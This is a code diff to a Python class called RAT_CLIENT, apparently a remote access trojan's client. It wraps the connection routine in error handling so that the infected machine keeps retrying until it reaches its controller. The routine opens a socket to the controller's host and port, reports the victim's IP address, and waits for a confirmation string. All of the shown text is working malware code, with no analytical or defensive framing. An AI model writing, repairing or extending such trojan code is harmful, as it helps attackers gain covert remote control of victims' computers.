@@ -44,14 +44,15 @@ class RAT_CLIENT:
     def build_connection(self):
         connected = False
         global s
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.host, self.port))
-        sending = socket.gethostbyname(socket.gethostname())
-        s.send(sending.encode())
-        command = s.recv(1024).decode()
-        if command == 'recibido':
-            connected = True
-            print("Connect Establisch")
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.host, self.port))
+            sending = socket.gethostbyname(socket.gethostname())
+            s.send(sending.encode())
+            command = s.recv(1024).decode()
+            if command == 'recibido':
+                connected = True
+                print("Connect Establisch")
         except socket.error as e:
             print("Attempting to connect...")
             time.sleep(10)
